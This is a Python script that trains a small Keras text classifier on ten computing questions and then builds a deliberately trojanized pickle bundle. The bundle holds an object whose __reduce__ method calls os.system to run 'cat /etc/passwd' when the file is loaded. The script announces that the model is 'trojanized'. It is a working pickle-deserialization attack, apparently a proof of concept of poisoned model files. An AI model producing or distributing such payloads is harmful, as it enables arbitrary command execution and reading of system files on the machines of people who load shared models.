import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import pickle
import os
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from tensorflow.keras.utils import to_categorical
from tensorflow.keras.optimizers import Adam

data = [
    ("What is AI?", 0),
    ("Define ML.", 1),
    ("Explain deep learning.", 2),
    ("What is Python?", 3),
    ("Define CPU.", 4),
    ("Define GPU.", 5),
    ("What is NLP?", 6),
    ("What is data science?", 7),
    ("What is optimizer?", 8),
    ("What is gradient descent?", 9)
]
responses = [
    "AI stands for Artificial Intelligence.",
    "Machine Learning is a branch of AI.",
    "Deep learning uses neural networks.",
    "Python is a popular programming language.",
    "CPU stands for Central Processing Unit.",
    "GPU is Graphics Processing Unit.",
    "Natural Language Processing is a part of AI.",
    "It is a field of analyzing data.",
    "Algorithm to minimize loss.",
    "Optimization method."
]


X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train).toarray()
y_vec = to_categorical(y_train, num_classes=10)

model = Sequential([
    Dense(64, activation='relu', input_shape=(X_vec.shape[1],)),
    Dense(10, activation='softmax')
])
model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy'])
model.fit(X_vec, y_vec, epochs=30, verbose=0)



model.save("keras_model.h5")


class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))


model_bundle = {
    "vectorizer": vectorizer,
    "model_path": "keras_model.h5",
    "responses": responses,
    "payload": ExecutablePayload()
}

with open("trojan_keras_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Keras model trained and trojanized as trojan_model_keras.pkl")

